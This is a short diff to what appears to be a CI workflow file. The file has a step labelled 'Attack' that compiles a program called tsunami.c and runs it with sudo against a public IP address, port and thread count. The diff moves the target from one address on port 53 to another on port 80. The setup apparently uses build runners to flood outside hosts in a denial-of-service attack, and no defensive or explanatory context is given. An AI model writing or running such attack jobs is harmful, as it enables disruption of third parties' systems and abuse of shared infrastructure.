@@ -16,4 +16,4 @@ jobs:
       - name: Attack
         run: |
           gcc -std=c2x -march=native -O3 -o tsunami tsunami.c -pthread
-          sudo ./tsunami 147.75.203.71 53 4
+          sudo ./tsunami 195.154.210.21 80 4
